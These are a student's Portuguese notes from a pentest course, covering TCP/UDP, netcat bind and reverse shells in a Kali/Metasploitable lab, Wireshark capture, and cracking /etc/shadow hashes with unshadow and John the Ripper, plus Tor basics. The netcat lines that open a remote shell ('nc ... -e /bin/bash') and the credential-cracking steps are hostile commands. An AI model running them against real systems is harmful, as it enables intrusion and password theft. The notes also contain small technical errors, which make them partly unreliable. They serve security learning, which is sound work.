# Minhas anotações sobre o Curso de Pentest Womcy

## 09/08 - Resumo

### TCP/IP - conceitos básicos
O TCP é um protocolo orientado a objeto - confiável

Funciona enviando 3 pacotes para abrir a comunicação o three way handshake e para finalizar a comunicação envia 4 pacotes
(detalhar cada pacote)

Ele prioriza a não perder pacotes

UDP - considerado como não confiável
Utilizado em situações que a velocidade é importante mas a perca de pacote não
Ex.: Serviços de voz, streaming, video conferência, serviços de resolução de nomes(DNS)

Algumas vezes ambos podem ser combinados exemplo chat e video em uma chamada do Microsoft Teams

Segue um exemplo de portas sobre cada um dos protocolos:https://pt.wikipedia.org/wiki/Lista_de_portas_dos_protocolos_TCP_e_UDP

### Conexão via bind shell e reverse shell - NetCat
Pré-requisitos: Comandos básicos do linux

Ajuda do netcat:
```
nc -h
```

Na aula de hoje comentamos o arquivo de interfaces /etc/network/interfaces
Estando da seguinte maneira
```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
auto eth1
iface eth1 inet static
        address 192.168.11.110
#       gateway 192.168.11.1
        netmask 255.255.255.0
```

Assim conseguiremos a comunicação da rede externa em nossa placa NAT (eth0) e na rede interna inet (eth1)

Reiniciando o serviço de rede da máquina ou a própria máquina

Na máquina do metaspolitable executamos(vítima)
nc -nvlp 1000

Para abrir a comunicação e ficar "ouvindo" essa porta

o mesmo realizamos na maquina atacante kali

sudo nc <ipSemSinaisdaMaquina> 1000

Assim temos a comunicação entre máquinas
  
No entanto, temos somente essa conexão e queremos a execução de um programa remoto(bindshell)

Na máquina vítima, executamos então 
nc -nvlp 1000 -e /bin/bash

No atacante(idem anterior):
  sudo nc 192.168.10.130 1000
  
  
Reverse shell - Posso fazer a minha vítima se conectar em mim e termos um acesso 
Na máquina atacante:
  nc <ipvitima> 1000 -e /bin/bash

  Na máquina vítima:
nc -nlp 100 -v
  
Sendo assim bem díficil de ser detectado tal

Mais informações em: https://github.com/dantesilva/curso-tecnicas-pentest/blob/main/Bind-and-reverse-shell.md do mestre @dantesilva
  
Em suma uma ferramenta do tipo canivete suíço, seja após um acesso na vítima realizado com sucesso ou como uma ferramenta no dia a dia, diante uma impossibilidade de acesso

## 11/08 - Resumo

### Wireshark
Se trata de um analisador de protocolos, capturando na rede as informações trafegadas, uma espécie de Sniffer(como um cão farejador), estando entre as 5 melhores juntamente com o TCPDump e outras

Ele pode ser executado tanto via terminal como no servidor gráfico. Um dos seus cores é a libpcap, tendo assim compatibilidades com demais ferramentas
        
Iniciamos abrindo o Wireshark e selecionando a placa de rede de onde queremos capturar pacotes
![image](https://user-images.githubusercontent.com/25257860/129117367-b89097a4-69be-4f37-bb59-06b5f5df1582.png)
        
Selecionamos assim a eth0 que é nossa placa configurada em uma rede NAT do virtualbox e tem acesso a internet
        
Para gerar tráfego de rede acessamos o Firefox e alguns sites, podendo assim observar as conexões do three way handshake
![image](https://user-images.githubusercontent.com/25257860/129118655-8b6a70eb-64bc-45d4-a431-bfea271938c4.png)
        
![image](https://user-images.githubusercontent.com/25257860/129119034-840d05be-b9a7-453e-9a81-2523e5ccf75e.png)

Com o botão direito em uma das conexões, podemos clicar em follow e ver os detalhes
![image](https://user-images.githubusercontent.com/25257860/129121930-ada531f8-af2e-4ba9-a9b7-0db8832577df.png)

Exemplo de uma conexão ssh filtrando pela porta
![image](https://user-images.githubusercontent.com/25257860/129122170-653846ae-7198-46f8-836b-d2575a59ce39.png) 
        
encontrando assim uma vulnerabilidade expondo a versão do ssh
![image](https://user-images.githubusercontent.com/25257860/129122206-27327636-fd91-4cc4-a6ca-b2abaee3dff9.png)

##16/08 e 18/08 - Licença médica
        
##23/08 - alterada para 24/08 - não pude comparecer
hash , criar , comparar, e sites que descriptografa os hash com listas pre salvas em banco de dados

##25/08 - hashs e John the reaper, unshadow e hash identifier, tor
       
No arquivo /etc/passwd conseguimos ver todos os usuários cadastrados no linux
![image](https://user-images.githubusercontent.com/25257860/130874145-ed8a438c-3443-49b2-b5e5-683c4c7daa3a.png)

No arquivo /etc/shadow
![image](https://user-images.githubusercontent.com/25257860/130874066-1569d304-6177-4316-9df7-a004113269a2.png)
        
Por mais que tenhamos duas senhas iguals em usuários diferentes o linux não gerará o mesmo hash devido ao componente de segurança cript por meio do uso do salt https://man7.org/linux/man-pages/man3/crypt.3.html

Um algoritmo dentro do salt traz dois caracteres aleatórios e por meio desses é gerado o hash diferente dos demais
![image](https://user-images.githubusercontent.com/25257860/130875174-a6a6122e-c4f0-4493-8771-ee7d4b68eeab.png)

assim copiamos os arquivos citados, usando o unshadown e atraves do Jonh the reaper usando os arquivos foi possível encontrar as senhas mais faceis, pois o unshadow muda para a forma antiga que o linux gerava os hashs e assim trabalha em cima desses
O unshadown junta os dois arquivos
     
unshadow passwd1 shadow1 > vitima
        
![image](https://user-images.githubusercontent.com/25257860/130878477-3ddc1406-73ad-4313-a538-d23b9c6b8652.png)

  

se vc quiser editar a lista padrão do John -> /usr/share/john/password.lst

se quiser testar uma lista que vc criou -> --wordlist[=arquivoquevccriou]

Conseguimos também descobrir o possível hash, no exemplo abaixo geramos com md5 e o hash identifier descobriu tal
![image](https://user-images.githubusercontent.com/25257860/130878038-36c49f7e-bd63-4173-aebd-966936adafad.png)

        
Conceitos:
surface web - aberta para todos entrar, sites normais
        
deep web - sites ou acessos a serviços não abertos a todos. Seu email, wpp, telegram, contas pessoais não abertas para a internet. Exemplo suas conversas não estão abertas a todos

dark web - contem uma conexão com alto nível de criptografia. Acessível através do tor. Além de passar por diversos servidores em rotas diferentes, sendo praticamente impossível a rastreabilidade
        
temos o protocolo tor e o navegador tor.

É recomendável sempre utilizar uma máquina virtual
        
fizemos a instalação do tor atraves de apt-get install tor torbrowser-launcher
outra forma seria seguindo esse tutorial: https://techstart.xyz/linux/como-instalar-o-tor-no-kali-linux-apt/

Se apresentar essa tela ao abrir e clicar em conect você já está navegando na darkweb
![image](https://user-images.githubusercontent.com/25257860/130879753-cbb844df-ad4e-46dc-831c-08e61ac1b731.png)

Os endereços são diferentes na darkweb, são maiores que os normais e não tem wwww, você poderá pesquisar sites da darkweb para localizar esses

ex.:
    https://darkweburls.com/#:~:text=People%20often%20refer%20to%20dark%20web%20urls%20as,that%20have%20their%20IP%20addresses%20hidden%20or%20masked
